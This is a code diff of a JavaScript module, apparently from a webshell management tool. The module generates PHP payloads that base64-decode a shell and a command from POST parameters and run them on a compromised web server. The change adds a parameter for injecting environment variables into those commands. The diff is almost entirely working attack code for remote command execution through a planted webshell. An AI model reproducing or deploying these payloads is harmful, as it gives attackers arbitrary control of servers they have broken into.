@@ -2,16 +2,25 @@
  * 虚拟终端命令执行
  */
 
-module.exports = (arg1, arg2) => ({
+module.exports = (arg1, arg2, arg3) => ({
   exec: {
     _: `$p=base64_decode($_POST["${arg1}"]);
       $s=base64_decode($_POST["${arg2}"]);
+      $envstr=@base64_decode($_POST["${arg3}"]);
       $d=dirname($_SERVER["SCRIPT_FILENAME"]);
       $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";
       if(substr($d,0,1)=="/"){
         @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
       }else{
         @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
+      }
+      if(!empty($envstr)){
+        $envarr=explode("|||asline|||", $envstr);
+        foreach($envarr as $v) {
+          if (!empty($v)) {
+            @putenv(str_replace("|||askey|||", "=", $v));
+          }
+        }
       }
       $r="{$p} {$c}";
       function fe($f){
@@ -94,7 +103,8 @@ module.exports = (arg1, arg2) => ({
       $ret=@runcmd($r." 2>&1");
       print ($ret!=0)?"ret={$ret}":"";`.replace(/\n\s+/g, ''),
     [arg1]: "#{base64::bin}",
-    [arg2]: "#{base64::cmd}"
+    [arg2]: "#{base64::cmd}",
+    [arg3]: "#{base64::env}"
   },
   listcmd: {
     _: `$arr=explode(",",base64_decode($_POST["${arg1}"]));
